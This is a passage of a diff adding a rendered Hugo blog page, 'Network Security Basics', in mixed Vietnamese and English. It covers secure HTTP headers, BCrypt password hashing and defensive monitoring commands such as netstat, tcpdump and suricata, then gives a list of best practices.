+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">hostname</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="na">getPeerPrincipal</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">getResponseCode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Status: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">statusCode</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<h3 id="secure-headers">Secure Headers</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>HTTP Response Headers:
+├─ Strict-Transport-Security: max-age=31536000
+│  (Force HTTPS)
+├─ Content-Security-Policy: default-src &#39;self&#39;
+│  (Only load resources from same origin)
+├─ X-Content-Type-Options: nosniff
+│  (Prevent MIME sniffing)
+├─ X-Frame-Options: DENY
+│  (Prevent clickjacking)
+└─ X-XSS-Protection: 1; mode=block
+   (Enable XSS filter in browser)</code></pre></div>
+<h2 id="password-security">Password Security</h2>
+<h3 id="bad--1">Bad ❌</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Store: password = &#34;mypassword123&#34;</code></pre></div>
+<p><strong>Problem:</strong> If DB breached, all passwords exposed</p>
+<h3 id="good--1">Good ✅</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-java">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BCryptPasswordEncoder</span><span class="w"> </span><span class="n">encoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BCryptPasswordEncoder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">hashed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">encoder</span><span class="p">.</span><span class="na">encode</span><span class="p">(</span><span class="s">&#34;mypassword123&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Stored: $2a$10$dXJ3SW6G7P50eS3QNutsnO...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Verify</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">encoder</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="s">&#34;mypassword123&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">hashed</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="kc">true</span></span></span></code></pre></div></div>
+<p><strong>Hash vs Encryption:</strong></p>
+<ul>
+<li>Hash: One-way (cannot recover original)</li>
+<li>Encryption: Two-way (can decrypt)</li>
+</ul>
+<h2 id="network-monitoring">Network Monitoring</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Monitor connections</span>
+</span></span><span class="line"><span class="cl">netstat -an
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Detailed packet analysis</span>
+</span></span><span class="line"><span class="cl">tcpdump -i eth0 -n host 192.168.1.100
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for suspicious activity</span>
+</span></span><span class="line"><span class="cl">sudo tail -f /var/log/auth.log <span class="p">|</span> grep Failed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Intrusion detection</span>
+</span></span><span class="line"><span class="cl">sudo suricata -c /etc/suricata/suricata.yaml -i eth0</span></span></code></pre></div></div>
+<h2 id="security-layers">Security Layers</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>                    ┌─────────────┐
+                    │ Application │ (XSS, SQL Injection, CSRF)
+                    └─────────────┘
+                          ↓
+                    ┌─────────────┐
+                    │   Network   │ (Firewall, IDS)
+                    └─────────────┘
+                          ↓
+                    ┌─────────────┐
+                    │   Encryption│ (TLS/SSL)
+                    └─────────────┘
+                          ↓
+                    ┌─────────────┐
+                    │ Authentication
+                    │  &amp; Auth     │ (MFA, Passwords)
+                    └─────────────┘</code></pre></div>
+<h2 id="best-practices">Best Practices</h2>
+<ol>
+<li><strong>Always use HTTPS</strong>: Encrypt all data in transit</li>
+<li><strong>Hash passwords</strong>: Never store plain passwords</li>
+<li><strong>Validate input</strong>: Check user data</li>
+<li><strong>Use firewalls</strong>: Restrict access</li>
+<li><strong>Keep updated</strong>: Apply security patches</li>
+<li><strong>Disable defaults</strong>: Change default passwords</li>
+<li><strong>Monitor logs</strong>: Detect suspicious activity</li>
+<li><strong>Principle of least privilege</strong>: Give minimum needed access</li>
+<li><strong>Backup data</strong>: Recover from incidents</li>
+<li><strong>Educate users</strong>: Most breaches are human error</li>
+</ol>
+<h2 id="kết-luận">Kết luận</h2>
+<p>Network security là ongoing process:</p>
+<p>✅ Understand threats<br>
+✅ Implement defenses<br>
+✅ Monitor continuously<br>
+✅ Update regularly</p>
+<p>Bảo mật không bao giờ hoàn hảo 100%, nhưng việc làm khó hơn cho attackers luôn có giá trị!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/my-personal-blog/posts/2025-12-23-network-security/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn" data-hashtags="security,network,protection"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-hashtag="security"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn"><i data-svg-src="/my-personal-blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/my-personal-blog/posts/2025-12-23-network-security/" data-title="Network Security Basics — Bảo vệ Mạng của Bạn" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fmy-personal-blog%2fposts%2f2025-12-23-network-security%2f&amp;text=Network%20Security%20Basics%20%e2%80%94%20B%e1%ba%a3o%20v%e1%bb%87%20M%e1%ba%a1ng%20c%e1%bb%a7a%20B%e1%ba%a1n" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-nav"><a href="/my-personal-blog/posts/2025-12-23-tcp-ip-stack/" class="prev" rel="prev" title="TCP/IP Stack — Hiểu Kiến trúc Internet"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>TCP/IP Stack — Hiểu Kiến trúc Internet</a>
+            <a href="/my-personal-blog/posts/2025-12-23-load-balancing/" class="next" rel="next" title="Load Balancing &amp; Scalability — Mở rộng Ứng dụng">Load Balancing & Scalability — Mở rộng Ứng dụng<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/my-personal-blog/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/my-personal-blog/lib/autocomplete/autocomplete.min.js"></script><script src="/my-personal-blog/lib/lunr/lunr.min.js"></script><script src="/my-personal-blog/lib/lazysizes/lazysizes.min.js"></script><script src="/my-personal-blog/lib/clipboard/clipboard.min.js"></script><script src="/my-personal-blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/my-personal-blog/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script src="/my-personal-blog/js/theme.min.js"></script></body>
+</html>
